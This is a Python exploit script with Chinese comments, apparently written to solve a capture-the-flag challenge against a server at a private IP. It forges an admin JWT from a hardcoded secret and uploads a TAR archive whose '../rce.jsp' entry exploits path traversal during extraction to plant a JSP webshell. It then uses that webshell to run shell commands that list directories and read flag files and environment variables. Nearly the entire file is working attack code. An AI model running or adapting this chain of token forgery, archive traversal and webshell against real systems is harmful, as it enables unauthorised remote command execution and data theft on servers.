#!/usr/bin/env python3
"""
最终RCE - 修复TAR路径遍历漏洞利用
关键: TAR文件中的文件名应该直接是 ../xxx.jsp，而不是包含uploads目录
"""

import jwt
import requests
import tarfile
import io

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

print("[+] TAR路径遍历RCE Exploit\n")
print("[*] 目标: 解压时写入到 /usr/local/tomcat/webapps/ROOT/ (上级目录)\n")

# 创建极简JSP webshell
jsp_code = b"""<%@ page import="java.io.*,java.util.*" %>
<%
String c=request.getParameter("c");
if(c!=null){
Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;
while((l=br.readLine())!=null){
out.println(l);
}
}
%>"""

# 创建TAR - 文件名直接就是路径遍历路径
tar_buffer = io.BytesIO()
tar = tarfile.open(fileobj=tar_buffer, mode='w')

# 添加多个路径尝试
paths = [
    "../rce.jsp",  # 相对于uploads，到ROOT目录
]

for path in paths:
    info = tarfile.TarInfo(name=path)
    info.size = len(jsp_code)
    tar.addfile(tarinfo=info, fileobj=io.BytesIO(jsp_code))
    print(f"[*] TAR中添加: {path}")

tar.close()
tar_data = tar_buffer.getvalue()

print(f"\n[*] TAR大小: {len(tar_data)} 字节")

# 上传TAR
print("\n[*] 上传TAR到 /admin/upload")
try:
    files = {'file': ('rce.tar', tar_data, 'application/x-tar')}
    r = requests.post(
        f"{TARGET}/admin/upload",
        headers={"Cookie": f"token={admin_token}"},
        files=files,
        timeout=10
    )
    print(f"  状态: {r.status_code}")
    print(f"  响应: {r.text}")
    
    if r.status_code == 200 and "ok" in r.text:
        print("  [+] 上传成功!")
    else:
        print(f"  [-] 上传可能失败: {r.text}")
except Exception as e:
    print(f"  Error: {e}")

# 测试webshell
print("\n[*] 测试webshell访问...")
test_urls = [
    "/rce.jsp",
    "/uploads/rce.jsp",
    "/uploads/../rce.jsp",
]

for url in test_urls:
    try:
        r = requests.get(f"{TARGET}{url}", headers={"Cookie": f"token={admin_token}"}, timeout=5)
        print(f"  {url:25} -> {r.status_code}")
        
        if r.status_code == 200:
            # 检查是否是JSP源码还是执行结果
            content = r.text
            if "<%@ page" in content:
                print(f"    [!] JSP源码被返回（未执行）")
            else:
                print(f"    [+] 可能可执行! 测试命令...")
                
                # 测试命令执行
                r2 = requests.get(f"{TARGET}{url}?c=id", headers={"Cookie": f"token={admin_token}"}, timeout=5)
                print(f"    测试 'id' 命令:")
                print(f"    {r2.text[:200]}")
                
                if "uid=" in r2.text or "root" in r2.text:
                    print(f"\n[!] RCE成功! Webshell URL: {TARGET}{url}?c=COMMAND")
                    
                    # 开始查找flag
                    print(f"\n[*] 查找flag...")
                    commands = [
                        ("ls -la /", "列出根目录"),
                        ("ls -la /root", "列出/root"),
                        ("find / -name '*flag*' 2>/dev/null | head -20", "搜索flag文件"),
                        ("cat /flag 2>/dev/null", "尝试读取/flag"),
                        ("cat /root/flag 2>/dev/null", "尝试读取/root/flag"),
                        ("cat /flag.txt 2>/dev/null", "尝试读取/flag.txt"),
                        ("env | grep -i flag", "搜索环境变量"),
                    ]
                    
                    for cmd, desc in commands:
                        print(f"\n  [{desc}]: {cmd}")
                        r3 = requests.get(f"{TARGET}{url}?c={cmd}", headers={"Cookie": f"token={admin_token}"}, timeout=10)
                        result = r3.text.strip()
                        if result and len(result) < 2000:
                            print(f"  {result}")
                            if "flag" in result.lower() or "pcb" in result.lower():
                                print(f"\n  [!] 可能找到flag相关信息!")
                    
                    break
    except Exception as e:
        print(f"  {url:25} -> Error: {e}")

print("\n[+] 完成")
